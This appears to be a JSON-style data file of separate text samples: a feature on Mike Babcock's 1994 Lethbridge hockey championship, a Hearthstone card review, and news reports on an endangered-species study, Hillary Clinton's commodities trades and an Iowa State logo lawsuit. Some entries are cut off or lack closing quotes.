  "latent_18210": "With the snow-capped Canadian Rockies to the west and miles of Albertan farmland across the eastern frontier, the drive to the University of Lethbridge can at times feel infinite. Every so often, the speed limit along Highway 2 will dip and another hamlet will rise into view. But mostly it’s just your rental car, the empty lanes and horses spitting steam into the chill.\n\nThe campus itself sits some two hours south of Calgary, on a hill overlooking a river valley, one turn off Whoop-Up Drive. The street was named after an old 19th-century fort where American border-crossers would stop to trade whiskey for buffalo hides with local tribes, before hitching up and heading toward their actual destinations.\n\nTwenty-four years ago, a jut-jawed young man followed these same roads into town, accompanied by his wife and newborn daughter. He bought a brand-new house across Whoop-Up Drive, not far from the local rink where he had accepted a job to revive the University of Lethbridge Pronghorns men’s hockey team. Early on, the decision looked disastrous. One night in Sept. 1994, not long after the family arrived, a 30-year-old Mike Babcock came home from the first preseason meeting and declared, “This might be the last time I ever coach.”\n\nIt seems ridiculous, of course, imagining a world in which Babcock never stalked and glowered behind NHL benches for 1,114 games and almost 600 victories; never won two Olympic gold medals and the 2016 World Cup of Hockey while helming Team Canada; never lifted the 2008 Stanley Cup with the Red Wings. Soon he’ll likely finish as a Jack Adams Trophy finalist too, if not its eventual winner, for steering a rookie-laden Toronto Maple Leafs roster from 30th place last season to the Eastern Conference’s eighth seed this spring—the first worst-to-playoffs reversal since Philadelphia in 2007-08. But in thinking his coaching career might’ve reached an early end, Babcock was gravely serious. This makes what actually happened that much more magical.\n\nOver the next seven months, Babcock engineered perhaps the unlikeliest success story in Canadian college hockey history. It was a season deserving of a Disney film—provided screenwriters could work all the flaming liquor shots and F-bombs into a family friendly script. The championship rings referencing testicular fortitude would probably need some tweaking, too.\n\nBy the following summer, one of the smallest schools in the Canadian Interuniversity Athletics Union (enrollment 4,350) had captured its first, and still only, national title; a program had been rescued from extinction; and Babcock was ascending toward the NHL, off from the hitching post toward bigger things. Even now, as the Maple Leafs begin their first-round trial against the Presidents’ Trophy-winning Washington Capitals on Thursday, Babcock traces his proudest accomplishment back to the 1993-94 Lethbridge Pronghorns.\n\n“The best job I’ve ever done,” he says. “By far. Not even close.”\n\n***\n\nThe truth is, Babcock had already plotted his exit from hockey before arriving at Lethbridge. Heck, one skate was out the door. After getting fired from the Moose Jaw Warriors in ‘93 following two losing seasons, and passed over for vacancies with other Canadian junior teams, he’d agreed to a plum gig at a consulting firm. His wife Maureen had recently given birth to the couple’s first child, Alexandra, so he needed a steady salary to support them. Working hockey schools on the side wasn’t paying any bills.\n\nEntering its 10th-anniversary season, the Lethbridge hockey team had little reason to celebrate history. The Pronghorns had never finished above .500, never reached the Canada West playoffs and hit rock-bottom at 1-25-2 in ‘89-90. Babcock’s predecessor, Dave Adolph, did admirable work recruiting new talent; forwards Dana McKechnie and Gregg Gatto won conference rookie of the year honors in ‘91 and ‘92, respectively. Babcock also lured four freshmen with Western Hockey League experience, including a talented, hot-headed power forward who played for him in Moose Jaw named Jarret Zukiwsky.\n\nBut several other veterans had quit before training camp, preferring to enjoy college rather than endure a regime change. This left fewer than 25 at that initial meeting, which led Babcock to tell Lethbridge’s student newspaper, the Meliorist, “I almost went home and cried.” He coaxed some of the absentees to rejoin after some heavy guilt-tripping by Babcock. But mostly, the roster was made up of partially motivated 20-somethings perfectly happy to split weekend sets and otherwise enjoy college.\n\nAway from the rink, the Pronghorns indeed went plenty hard. One defenseman, John Curran, worked as the campus beer rep for Labatt so the fridge in his basement was always stocked. Usually they wound up at the Duke of Wellington, located behind the Pronghorns’ home rink at Nicholas-Sheran Arena, stumbling distance from the players’ houses. The Duke specialized in two-for-one Thursdays, trouble before a weekend series; cowboy boot nights too were rowdy affairs. The players also went through a phase where they would light sambuca on fire, slug the shot, suction the hot glass to their bare buttcheeks, and traipse around the bar. “I can still smell the lactic acid,” Babcock remembered recently.\n\nAnd so, once practices began, he skated everyone onto the verge of vomit. The worst exercise involved players sitting on the bench and waiting for Babcock’s whistle. At the first blast, they would vault over the dasher boards, sprint the width of the ice, touch the opposite wall, skate back, slap their partner’s hand, and wait for another round. Babcock called it the Dog F--- Line Change Drill. But he only worked them so hard because he saw promise. “Why don’t you guys believe in yourselves?” he would tell the team in the locker room. “Can someone answer that for me?”\n\nFaith followed results. The Pronghorns finished the preseason at 6-2-1, including 2-1-1 against conference foes. By the end of October they had pulled into a three-way tie for second place in Canada West, and earned their first-ever national ranking by sweeping the University of British Columbia the following weekend. The community buzzed with support. Players reported seeing their professors at Nicholas-Sheran, where standing-room crowds swelled several rows deep against the glass. When players ran into friends around campus, the first question they usually heard was, “How’d you do in the last game?”\n\nUsually, though, the excitement disappeared by the second question: “Do you think the program will be cut?”\n\n***\n\nIn 2008, Babcock clinched the Stanley Cup Final in Pittsburgh. He won the ‘97 under-20 world championships in Switzerland, the ‘04 world championships in the Czech Republic, and Olympic gold medals in both Vancouver (‘10) and Sochi, Russia (‘14). His earliest major victory, however, began across the river from the Lethbridge campus, in the basement of a bar called Sven Ericksen’s.\n\nIt was around mid-October. A month prior, during the Pronghorns’ preseason, word had broken that the university’s board of governors were “toying” with the idea of eliminating the hockey team. The program’s $125,000 annual budget represented only a fraction of the $2.7 million in proposed slashes. Nonetheless, it had landed in the committee’s crosshairs.\n\nSo Babcock attended community forums, met with academics and rallied public in bar basements. The players washed cars, pumped gas, hosted youth hockey clinics, and delivered presents during the holiday season. They enlisted sponsorships from local businesses. Took over the radio station, 1090 CKRX, and sold discounted ticket packages. In November, Don Cherry visited Lethbridge to promote the opening of one of his chain restaurants. He left with a hat and T-shirt emblazoned with the fundraising effort’s slogan: SAVE AN ENDANGERED SPECIES.\n\nLittle of it seemed to make any difference. Early into the New Year, the general faculties council met and recommended the cutting of all athletic programs by fall 1995. A board of governors vote was scheduled for mid-March. This put the team in limbo and thoughts of transferring in players’ heads. “To tell the truth,” Babcock railed to the Meliorist, “I’ve put my recruiting hat on the shelf until then and if they put it off as long as March 17, they hold no regard for the fact that we have to recruit. How do we even recruit, honestly or ethically? I find it very disturbing.”\n\nLooking back, Babcock says, only one thing truly worked: “By winning, they couldn’t cut the program.” Amid the steady scuttlebut about their uncertain future, the Pronghorns were rocketing up the national rankings, from seventh to second to No. 1 before the calendar hit December. It marked the first time any Lethbridge team, in any sport, had landed in the top spot. An early-January sweep over the University of Manitoba moved them to 13-3, surpassing their single-season wins record. Two weekends later, Zukiwsky set another team mark with four goals and six assists in two games.\n\nWhen they were together in Moose Jaw, it hadn’t taken Babcock long to figure out the fiery Zukiwsky. Particularly that negative reinforcement made him tick. During practice Babcock skated beside his star forward, slashing him on the forearms to get him ready for opponents who would do the same. “Zuk, you suck at that drill,” he often yelled. “Are you going to put an effort in today?” Or, before games: “You’re not going to play the power play. You’ll be lucky to get a regular shift.” More often than not, Zukiwsky would respond with a hat trick. “And Mike would just laugh,” he says.\n\nIt wasn’t all iron-fisted rule, though. If Babcock sensed Zukiwsky winding up too tight, he’d sit him on the bench and wait a few shifts before asking, “Are you ready to go now? Are you back?” After Babcock made Zukiwsky one of the captains in Moose Jaw, they started hunting elk and deer together; when Alexandra was born, Zukiwsky showed up to the hospital with a giant stuffed teddy bear. “He’s the best motivator I’ve ever seen in my life,” Zukiwsky says. “A lot of coaches will be personal with players, but it’s about creating a relationship where you want to perform for him.”\n\n“To me, life’s simple,” Babcock says. “You put your foot on that long skinny thing on the right—the gas—and your fun meter should be on high and your work meter should be on high. Some people believe you can’t have your cake and eat it too. I don’t buy that. You can do it all.”\n\nCourtesy: University of Lethbridge Athletics\n\nTake the final weekend in January, when Lethbridge flew to Vancouver with a chance to clinch its playoff berth against the University of British Columbia. In the dressing room before the series opener, Babcock made a deal. “You win both,” he said, “it’s a green-light night. You don’t get both, there’s a curfew.” Sure enough, after four goals from Trevor Ellerman, one of four leftovers from the 1-25-2 season, clinched the sweep on Saturday, the players hit the town that night to celebrate. And sure enough there was Babcock at the same bar, cutting a rug on the dance floor. “Oh,” Gatto thought. “He does have a heartbeat.”\n\nOf course, a dash of divine intervention helps too. After dropping the opener of their first-ever playoff series against Regina, the Pronghorns had roared back to force overtime in Game 2. As they sat in the home locker room at Nicholas-Sheran before the extra period, an old rotary phone located in the training room started ringing.\n\nGatto piped up. “Dana,” he said to McKechnie, “the phone’s for you. It’s God.”\n\n“What’s he want?”\n\n“He wants us to win this hockey game.”\n\nThey did, 2-1, and then again in overtime in the rubber match. And so for the rest of their miraculous run, past Calgary in three games for the Canada West title and onto the Canadian Interuniversity Athletic Union semifinals, one of Babcock’s assistants would always sneak away during intermission, find a pay phone, and ensure that the Good Lord kept calling Lethbridge.\n\n***\n\nThe Pronghorns arrived in Toronto with underdog status against Acadia University, the defending national champs. Babcock gladly played into the perception. “I just hope there are two pucks out there so we could play,” he humbly told reporters during media day, having heard enough talk about Acadia’s high-powered attack.\n\nIn reality, though, Lethbridge was brimming with confidence; Babcock had even started wearing a strip of tape around his pinkie finger, reserving the spot where he planned to slip a title ring. Lethbridge had its own dynamic offense led by Zukiwsky, whose 63 points topped the conference. They also had the best goalie in the country.\n\nListed at 5-8 and 168 pounds, Trevor Kruger was an undersized late-bloomer who didn’t transition into the crease until age 12. At 18 he got called up to join the WHL’s Swift Current Broncos and his older brother, Scott, around Boxing Day 1986. Four days later, on Dec. 30, the team was headed to Regina when the bus struck some black ice and crashed. Four died, including Scott. “It’s one of those tragic things,” Trevor says. “You move on, right? We didn’t have much time to really think about things. I wasn’t one to sit there…I had my grieving time for sure with my family, and then after the funeral and the gathering at the rink, it was right back to hockey.”\n\nUnlike Babcock, though, Kruger fully expected to end his career at Lethbridge. After backstopping Swift Current to an emotional Memorial Cup in ‘89, two and a half years after the crash, Kruger had slogged through seven pro games in the East Coast Hockey League before returning home to Alberta, hoping to get his degree and get on with life. He instantly became one of the Pronghorns’ best players, but showed little interest in things like working out or showing up early for extra practice.\n\nIf Babcock guided Zukiwsky with crack-the-whip, slash-the-hands discipline, he was equally hands-off with his star goalie. Kruger felt free to indulge in his goalie quirks, like conducting pregame stretches in the shower. Or how, if a scrum of players jostled for possession the corner, Kruger would skate over, pick out the puck, and spark a breakout the other way.\n\nOnly one time did Babcock truly intervene. Early into the semifinal against Acadia, Kruger wandered from his net to play the puck and lost his footing, leading to a virtual empty-netter. The Pronghorns prevailed 9-6 and though Kruger made 42 saves he couldn’t shake the first-period gaffe. Babcock knew why.\n\nPart of Kruger’s pregame routine involved taking the edge off with a few cold ones the night before. At home this usually happened at the Duke, but Kruger had forsaken the tradition altogether in Toronto. And so, on the afternoon before the national title game against Guelph, Babcock handed Kruger $20 with strict instructions to Go. Drink. Beer. Now. “The message was,” Babcock says, “you can’t play the game with your a-- slammed shut.”\n\nIt worked. First Kruger downed a couple Coors and Labatt at a bar near the team hotel. Then he stopped 32 shots before 7,300 at Maple Leaf Gardens—and a national TV audience—in a 5-2 win. Ellerman was named tournament MVP, and Zukiwsky the CIAU rookie of the year.\n\nDuring postgame interviews Kruger was quick to thank his coach, \"the spark plug to our engine.\" And then, he said, while winning the Memorial Cup for Swift Current was \"an emotional thing...right now I feel more pride in this because nobody ever thought it was possible. I mean, the lowly Pronghorns go all the way? You’ve got to be kidding.\"\n\n***\n\nThe ensuing party raged for days. It started in a hotel ballroom in downtown Toronto and migrated overnight to a recently opened restaurant called Wayne Gretzky’s, where Babcock’s daughter fell asleep inside the CIAU trophy bowl.\n\nIt continued as the team returned to campus, where 200 were waiting at Nicholas-Sheran, and across the parade route that ended at City Hall. Like always, it finished at the Duke. There, around 2 a.m., a replay of the championship game came onto the big screen TV. What few Pronghorns remained then filled the trophy with whiskey and cola, scooping their cups and rewatching their win.\n\nAll was clearly settled on the bureaucratic side, too. At the March 17 board of governors meeting, four days after the final, the chairman brought champagne and members took turns sipping from the trophy.\n\nAnd later, when the Pronghorns received their rings, they would find two reminders of their journey, courtesy of Babcock. First, an inscription in the case read, Go Hard or Go Home. And etched into the underside of the band were the words Babcock had hollered all season long, imploring his players to do whatever it took to win:\n\nBIG BALLS.\n\n***\n\nA few weeks later, Babcock summoned the Pronghorns to his house for a postseason barbecue. They brought their lawn chairs and adult beverages. Babcock brought a bombshell: He had accepted an impossible-to-refuse, three-year deal with the WHL’s Spokane Chiefs. After only seven months on campus, he was gone from Lethbridge.\n\nThe program has ebbed and flowed since, unable to recapture the magic of ‘93-94. A decade later, in ‘04-05 under current Carolina Hurricanes coach Bill Peters, the Pronghorns went 5-29-2. Gatto reached the playoffs three times while helming his alma mater’s bench, but was dismissed in Feb. 2014 after three straight sub-10-win seasons.\n\nThat April, Lethbridge hired Spiros Anastas, who had been working as an assistant for the Grand Rapids Griffins, the minor-league affiliate of Babcock’s Red Wings. When Anastas first made the turn off Whoop-Up Drive and began purging junk from the coaches’ office at Nicholas-Sheran, he came across an old, dusty newspaper clipping with the headline, BABCOCK PROUDEST OF PRONGHORNS’ TITLE. Today, as the rebuild continues—Lethbridge just won 11 games for the second consecutive year—that article is still taped above Anastas’s desk for inspiration. “He’s almost become a symbol of hope for all the U of L sports,” he says of Babcock.\n\nMany of the players still live in southern Alberta. A few occasionally drop by Nicholas-Sheran, where the crowds aren’t close to standing room-only anymore. McKechnie comes to watch his son, Sam, who had 12 points for the Pronghorns this season. Zukiwsky didn’t develop the same rapport with Babcock’s successor but hopscotched around some European and North American minor leagues for a while; he now works as a safety consultant in Lethbridge. True to his plan, Kruger quickly landed a full-time job after graduation, helping adults with disabilities. “I had a $35,000 student loan,” he says, “so I thought I’d get to work.” Today, he helps coach his daughter’s team.\n\nYou know where Babcock went after he left, of course. But know too that Lethbridge has never left him, either. A few months ago, when a reporter called to reminisce about the Pronghorns, Babcock was in his Leafs office at Air Canada Centre. On his desk was a baseball cap, which Babcock had found while cleaning up the house after his father, the elder Mike Babcock, died in March 2015. He wore it into work that morning, as he often does.\n\nIt says SAVE THE HORNS.",

  "latent_18258": "A new study carried out by Defenders for Wildlife has found that the US Fish and Wildlife Service did not stop any of the 88,000 development projects that could have posed potential risks to endangered species.\n\nThe study’s authors say it should dispel claims that the Endangered Species Act threatens projects such as logging old growth forests, dams or bridges.\n\nThere are opposing views about the effectiveness of the Endangered Species Act. Conservationists often argue that federal agencies fail to strictly apply the act and allow massive infrastructure projects to go ahead without adequate conservation controls. They also say agencies approve smaller projects that erode habitat, something that is rarely tracked.

  "latent_18292": "The best and worst Karazhan cards according to the pros\n\nWhen new cards are announced, the Hearthstone community stirs more than ever. Expansions and Adventures keep Hearthstone alive, as a dynamic metagame is key to card games. It is in these times that the majority of the community looks to professionals for their opinion on the upcoming content. Many pros do not shy away from giving their opinion, albeit in various forms. Some make YouTube videos, others make spreadsheets and every once in a while you'll find a blog or article on it.\n\nIn this article you will find the 5 worst cards and the 5 best cards according to the pros' reviews, plus a small bonus. To determine the list I compiled data of pros who rated the cards with numbers, e.g.: 4/5 or 8/10. These scores added up created a score for each card, resulting in a bottom 5 and top 5. To reflect the thoughts of more pros, you will find quotes underneath cards from players who did not rate with numbers themselves, but still agree with the general consensus.\n\nThe worst\n\n#5 – Silvermoon Portal\n\nThe 4-mana slot has always been clogged, not least for Paladins. Piloted Shredder dominated when it was still in Standard, and more recently Keeper of Uldaman has become the go-to card for the class. Blessing of Kings, often regarded as a 4 mana 4/4 with charge, has been losing its popularity but is still a powerful card. Decks have been popping up including Djinni of Zephyrs, but none appear strong thus far.\n\nAbout Silvermoon Portal Thijs stated: “2 mana +2/+2 is already a spot where I don’t think it’s worth it. You also need board control and you can just play Keeper of Uldaman, which is way better.”\n\n#4 – Pantry Spider\n\nNow that the card has already been released, people have started to realize that Pantry Spider has amazing synergy with Evolve. For 4 mana one can summon two random 4-drops; often a big tempo play. In the ideal situation both the spiderlings could even transform in the infamous Flamewreathed Faceless. However, upon reveal, Pantry Spider didn’t seem too exciting, as it was mostly placed in the beast-playing classes Druid and Hunter.\n\nStrifeCro, who did see the Evolve-synergy, says: “(…) Druid has better turn 3 beasts by far, and Hunter has Carrion Grub which is comparable and also not that playable. Pantry Spider could be a great card in Evolution Shaman, but that deck becoming strong is something that I would not expect.\n\nThe dream!\n\n#3 – Pompous Thespian\n\nAs Frostwolf Grunt cried in its coffin, many wondered why Pomous Thespian was released in an Adventure, and not in an expansion such as Goblins vs. Gnomes or The Grand Tournament. In a card pool as small as an Adventure’s it is felt that there should be little to no vanilla cards, since we don’t get new cards often. The only other vanilla card to be released in an Adventure thus far was Murloc Tinyfin, which has the small upside of having the ‘Murloc’ tag.\n\nAs Chakki put it in his joint card review: “I’m disappointed that this is in our 45 card set. Why couldn’t they just save this for an expansion? Oh well… bad card.”\n\n#2 – Moroes\n\nInfinite value, that is what Moroes theoretically could provide. Theoretically. That is if your opponent doesn’t play any form of AoE damage or random damage card and, to state the obvious, not a single viable deck plays without AoE. There’s synergy to be found with Steward of Darkshire and Knife Juggler, but it was Hobgoblin that possibly could’ve made Moroes really shine, hadn’t it been banned in Standard.\n\nTrying to give a positive spin to the card Brian Kibler notes: “It could be a card that finds a role in decks that are looking to play a bunch of minions and continue to refill the board (…), but I’d be hard pressed to really see this card taking off in constructed play.”\n\n#1 – Purify\n\nNever has a card caused such outrage upon its reveal as Purify, and it should be no surprise that this card tops the list. Paying 2 mana to draw a card is bad, and as a sacrifice you also have to make your own minions (with the exception of Eerie Statue and Ancient Watcher) worse? The Hearthstone subreddit flooded with debates, jokes, and demands for an explanation from the developers. That explanation came in the form of Lead Designer Ben Brode releasing a video explaining what the thought process behind Purify was and, ultimately, agreeing that it might’ve been a mistake to release Purify in this Adventure.\n\nAs for the pro-scene, Frodan hit the nail on the head when during the live reveal of Purify he hesitantly said, after a long quiet period: “I always love making my own minions… worse.”\n\nThe best\n\n#5 – Kindly Grandmother\n\nVery reminiscient of Haunted Creeper, the Kindly Grandmother is a very potent 2-drop. In some aspects it’s slightly worse than the spider from Naxxramas – it spawns only one token, wich is easier to deal with – but there are some big upsides to it too. First of all, both the Kindly Grandmother and its token the Big Bad Wolf are beasts, which allows for strong synergies like Houndmaster and Kill Command. Secondly, 3 attack is a big threat in the early game and, when combined with the aforementioned synergies, needs to be dealt with.\n\nReviewing the card, Reynad said: “The fact that you’ll be able to guarantee to have some board presence as a Hunter is gonna make your Houndmasters absurd. It’s going to give you some game against your hard match ups like Zoo; it’s just a super powerful beast card.”\n\n#4 – The Curator\n\nAt first glance, the effect of the Curator seems a bit too specific for its cost. A 7 mana 4/6 is awfully bad, even with taunt. Just take [card]Twin Emperor Vek’lor[/card] if its effect doesn’t trigger as an example. However, the seemingly odd combination of drawing a Murloc, Dragon and Beast is stronger when analyzed further. It’s still a grey area what Murlocs could fit in, but Azure Drakes fit in many decks, and Stranglethorn Tigers are appearing more and more every day. All of a sudden, this card is comparable to a pre-nerf Ancient of Lore, but with taunt.\n\nFirebat noted: “I could see this card being extremely competitive in a lot of decks, especially Druid. You Innervate this bad boy out, draw two cards, refill your hand and you’re good to go. It’s like Innervating Ancient of Lore.”\n\n#3 – Medivh's Valet\n\nTempo is key in Hearthstone and, inherently, tempo swings are extremely powerful. Medivh’s valet is exactly a card that’s able to provide such a swing. Fire Elemental was the first card to have the ‘deal 3 damage’ battlecry effect, followed up by Blackwing Corruptor. It is no coincidence that both of these cards are regarded as very strong; they create big tempo. Its requirement could be hard to be met as your opponent may try to trigger your Secrets before you can play this card. An exception to this is, in most cases, Ice Block, which basically guarantees to stay active for a long time.\n\nTrump says about Medivh’s Valet: “I love this card because it enables different decks. Do you know how much mana ‘deal 3 damage’ is worth? It’s basically worth 2 mana. So that’s tremendous value (…). It encourages Secrets build, Control build, perhaps Reno?”\n\n#2 – Barnes\n\nThe king of Karazhan’s drama department has already caused a lot of frustrating moments in the game. From the moment it was shown many saw the potential of getting a 1/1 Ragnaros the Firelord, Sylvanas Windrunner or Tirion Fordring on the board – often said to be a game winning play on turn 4. Barnes is what the Hearthstone developers like to call a ‘build-around’ card, as it doesn’t easily fit in any deck. After all, getting a 1/1 minion which usually has a battlecry effect or even no effect at all is far from ideal. It has to be noted that, should a 1/1 copy of a deathrattle minion be summoned by Barnes, that minion will be summoned by N'Zoth, the Corruptor in its full glory, making Barnes’ effect even more powerful.\n\nAbout Barnes, Amaz said: “I think Barnes is really insane. If you build your deck right, you’re alway gonna get some value no matter what. Imagine you put this in a Reno Rogue deck with N’Zoth, and you get a 1/1 Tomb Pillager: you get a coin so that’s fine. If you pull an Undercity Huckster that’s insane. It has a lot of potential to be good.”\n\n#1 – Menagerie Warden\n\nWhereas Purify was heavily criticized for being too bad of a card, Menagerie Warden was its opposite: it received criticism for being too strong. Various streamers and pros named the design ‘lazy’, as it provides Beast Druids with a humongous powerplay. The most ideal situation, playing this card on a Stranglethorn Tiger, allows for a 6 mana 10/10 that deals 5 damage as a battlecry. When running the numbers on it, the Menagerie Warden is already good when played on most 3-cost beasts, and even copying an Enchanted Raven is not horrible.\n\nGaara stated: “This card is nuts. I don’t know why you would print a card like this. It may be even a bigger mistake than Purify. Because when a card is bad, you just don’t play it. But when a card is broken, it’s not fun. It will be a staple in every deck and dictate the meta and, eventually, all you will see is decks that try to beat this card.”\n\nBonus\n\nThe card pros don't agree on\n\nReviewing cards is tough: time's proven that more than once. Troggzor the Earthinator was thought to be overpowered, but it was rarely seen. On the other hand, Dr Boom unexpectedly turned out to be a staple in many decks. There are always different opinions on cards, but in this Adventure Nightbane Templar takes the crown. With a standard deviation of 3(!), the pros do just not have a straight opinion on this card. The obvious deck this belongs in is Dragon Paladin, but even the style of Dragon Paladin was debated. Some argued for a more aggressive deck, whilst others see Control Dragon Paladin happening.\n\nChakki rated the card 2/10, and stated: \"I don't really see what it does. It gets you into Keeper of Uldaman or Blessing of Kings but.... I think it's unplayable. Other Paladin decks are just better; you just run N'Zoth.\"\n\nThijs was a little kinder towards the card, but still no fan of it: \"I don't think this is necessarily a good card for Paladins. The only good thing about this card is that Paladins have a weak spot at 3-drops. But I still think it's too hard for Paladins to pull off the dragons, so I don't think this card is gonna be too flashy. I think there's potential, but even saying there is potential I don't think you will see it.\"\n\nOn the completely opposite side stands StrifeCro, who rated this card 5/5 - the only card to get this rating from him: \"A very strong new card for Dragon Paladin, this is 4/5 worth of stats for 3 mana. This is on the Muster for Battle levels of power and could give us a new age of Midrange Paladin anchored by dragons instead of dudes. Paladin has long been the class with some of the strongest midrange cards, but before GvG had too weak of an early game and after GvG became too meta warping with a strong early AND mid game. As of now, we still don’t have a super powerful turn 1 and 2 minion, but Nightbane Templar combined with Netherspite Historian can enable Midrange Dragon Paladin just off of the sheer power level of the cards.",
  "latent_18465": "The White House insisted today that Mrs. Clinton received no improper financial assistance on the trades from the lawyer, James B. Blair, a close friend who at the time was the top lawyer for Tyson Foods of Springdale, Ark., the nation's biggest poultry company. Mr. Blair has said that he had suggested that she get into the commodities market, and that he used his knowledge of trading to guide her along the way.\n\nDuring Mr. Clinton's tenure as Governor, Tyson benefited from several state decisions, including favorable environmental rulings, $9 million in state loans, and the placement of company executives on important state boards.\n\nMr. Blair and the Clintons denied any favoritism or conflict of interest when the trades were first reported earlier this month.\n\nThe commodities trades were the most successful investment the Clintons ever made. The nearly $100,000 profit enabled them to buy a house, invest in securities and real estate and provide a nest egg for their daughter, Chelsea.\n\nIn its statement, the White House said Mrs. Clinton accumulated trading profits of $49,069 in 1978 and losses of $22,548, for a net gain of $26,541. In 1979, the White House said, she had trading profits of $109,600 and losses of $36,600, for a net gain of about $73,000.\n\nMrs. Clinton did a small amount of commodities trading in a second account through her stockbroker at Stephens Inc. in Little Rock, Ark. In that account, according to officials, she had a net trading loss of about $1,000; she closed the account in March 1980, shortly after Chelsea was born.\n\nThe release of the trading documents today and tax returns made public on Friday show that in 1978 and 1979 the Clintons took on two high-risk investments with little money down but with Arkansas business figures as advisers or partners. One was the commodities trades.\n\nAdvertisement Continue reading the main story\n\nThe other was the Whitewater development. The tax returns released on Friday show the Clintons making a $500 investment as their total capital contribution to the Whitewater Development Company, a real estate venture in the Ozarks.\n\nTheir partner in the venture was a close friend, James B. McDougal, who later became a banker whose savings and loan was subject to broad state regulation. Critics of the Clintons have asserted that Mr. McDougal, who guaranteed a $200,000 loan taken out by the partnership, carried the brunt of the risk on the Whitewater venture.\n\nThe Clintons say that they ultimately lost about $42,000, mostly from interest payments, in Whitewater. But their relationship with Mr. McDougal is now being investigated by the independent counsel, Robert B. Fiske Jr., who is examining whether Mr. McDougal's savings and loan improperly diverted money into Whitewater or into Mr. Clinton's 1984 campaign for government.\n\nMr. Fiske said today that he could not comment on whether he would look into the commodities trades. But his charter is written broadly enough to enable him to examine the trades if he decided they were relevant. 'Bull Market' in Cattle\n\nBrokers and commodities officials differed today in their assessment of the account given by the White House.\n\nJack F. Sandner, chairman of the Chicago Mercantile Exchange, a hub of commodities trading, said that such profits were not unusual during the cattle futures market of the late 1970's, which he described as one of the most booming ever.\n\n\"At the time the First Lady was trading, it happened to coincide with the biggest bull market in the history of cattle,\" he said. \"When you are lucky enough to catch a dramatic market, you can take $1,000 and scale up and you can make a million. If somebody said they made a million dollars, I wouldn't be surprised at all.\"\n\nNewsletter Sign Up Continue reading the main story Please verify you're not a robot by clicking the box.

Brokers in the Refco office have said that most of her profits were in cattle futures.\n\nAdvertisement Continue reading the main story\n\nMany of her trades were done on margin, a common practice of investing by using borrowed funds. But regulators and traders said today that most brokers required customers trading on margin to put up additional collateral in case there are sudden losses.\n\n\"They would want some kind of a minimum until such time as a customer establishes a track record,\" said David Gary, a spokesman for the Commodity Futures Trading Commission.\n\nJoseph Collins, a lawyer for Refco, said that with the passage of time it is difficult to determine whether the Springdale office had such a rule. But he said that generally the decision whether or not to take on a customer with limited resources would be up to the individual broker. Consulting Blair\n\nWhite House officials acknowledged today that Mr. Blair was consulted on many of the commodities trades and was viewed as an important financial adviser, but they said other people, who they could not identify, were also consulted. A senior aide to Mrs. Clinton also said today that she occasionally spoke to her broker about the trades.\n\nBut brokers in the Springdale office of Refco where Mrs. Clinton executed the trades, including the one she describes as her personal broker, said in interviews in recent weeks that they have no recollection of ever talking with her about the trades.\n\nMrs. Clinton and Mr. Blair have said that they used Robert L. (Red) Bone, the broker who founded the Springdale office of Refco, a Chicago commodities firm, to execute the trades. But Mr. Bone, who worked at Tyson for 13 years until 1973, insisted in several interviews this month that he has no recollection of ever trading for Mrs. Clinton or talking to her about commodities trades.\n\n\"I can't recall ever dealing with the Clintons,\" Mr. Bone said in an interview on March 9. After Mr. Blair suggested that Mr. Bone was trying to protect the Clintons' privacy and recommended that a reporter try to talk to the broker again, Mr. Bone again insisted that he had no recollection of ever trading for the Clintons. Mr. Bone could not be reached for comment tonight.\n\nDuring the 1970's, Mr. Bone had been disciplined by regulators and settled charges that he tried to corner the egg market and that he had failed to keep proper records. Those accusations did not involve Mrs. Clinton's account. Mr. Bone's lawyer in both the regulatory proceedings and other legal disputes over the last 15 years has been Mr. Blair.\n\nAdvertisement Continue reading the main story\n\nAccording to the White House, Mrs. Clinton's commodity account was a type in which the client must personally approve each trade.\n\nThomas A. Russo, a New York lawyer who was the Commodity Futures Trading Commission's first director of trading and markets, said the only possible exception to this rule arises when a client grants power of attorney to a third party and allows them to order trades.\n\nThe rules in effect at the time, Mr. Russo said, otherwise required clients to specify the commodity, the price range and the amount. The only matter that could be left to the broker in such a circumstance is the precise timing of the order, he said.\n\nMr. Blair earlier this month said that he and Mrs. Clinton discussed potential trades; he said he gave her advice on whether to bet on prices rising or falling and she decided on the size of the trades. Omitted Details\n\nTax returns disclosed last Friday show that the Clintons claimed about $100,000 in capital gains from the trades. The returns, which the Clintons had declined to disclose during the campaign, were made public only after a New York Times article on March 18 revealed that the Clintons had made the commodities profits. But in the tax returns the Clintons ignored Internal Revenue Service instructions to detail how much money was invested, how much was earned and on what dates the trades occurred.\n\nToday the White House released brokerage statements that show many of the trades. The statements appear on an account that spells Mrs. Clinton's first name wrong and begin with an entry for cash for $1,000 on Oct. 11, 1978.\n\nThe White House said today that it released the information on Mrs. Clinton's stake in response to a Newsweek article published on Monday that quoted a Columbia University law professor as saying that Mrs. Clinton's investments were financially supported by Mr. Blair and could be considered to be a gift. The professor, Marvin A. Chirelstein, denied making such a statement.\n\nEvan Thomas, Washington bureau chief of Newsweek, said today that the report had been the result of \"an honest mistake and we regret that.\"",

(Photo: BILL NEIBERGALL/REGISTER file photo)Buy Photo\n\nTwo Iowa State University students are suing school officials after the university prohibited a pro-marijuana group from using the Cy logo on T-shirts that also featured cannabis leaves.\n\nAt issue is whether ISU, a government entity, can choose which groups are allowed to use the logo based on political or social beliefs in an effort to protect its brand. It's a lawsuit that will balance free speech rights against trademark law, said Christopher Proskey, a Des Moines patent and intellectual property attorney.\n\n\"Somebody else is using your mark in a way that damages the image that you're building for your trademark,\" he said. \"But, the other side of the coin is that governments and institutions cannot be picking favorites.\"\n\nAttorneys for ISU students Paul Gerlich and Erin Furleigh filed the federal lawsuit in the U.S. District Court for the Southern District of Iowa asking a judge to rule that the school violated students' First Amendment rights by banning the Cy logo on shirts made by the campus chapter of NORML, the National Organization for the Reform of Marijuana Laws.\n\nGerlich and Furleigh are the student groups' current president and vice-president, according to the lawsuit, which is part of a nationwide litigation campaign by the Foundation for Individual Rights in Education, or FIRE.\n\nISU officials banned the Cy logo on NORML's T-shirts in 2012 after the group's then-president displayed the shirt in a photo in The Des Moines Register.\n\nThe photo prompted complaints from lawmakers that the shirt featuring both Cy and a cannabis leaf made it look like the school endorsed marijuana legalization, officials said. The chorus of critics included Steven Lukan, the director of the Iowa Office of Drug Control Policy, who contacted ISU President Steven Leath with concerns after he was invited to one of the group's meetings last year, according to the lawsuit.\n\nThe T-shirt had previously been approved by the university before the photo ran in the newspaper, according to the lawsuit. In January 2013, the school responded to the controversy by updating its trademark policy to prohibit any uses of the Cy image tied to \"drugs and drug paraphernalia,\" according to the lawsuit.\n\nSince the change, 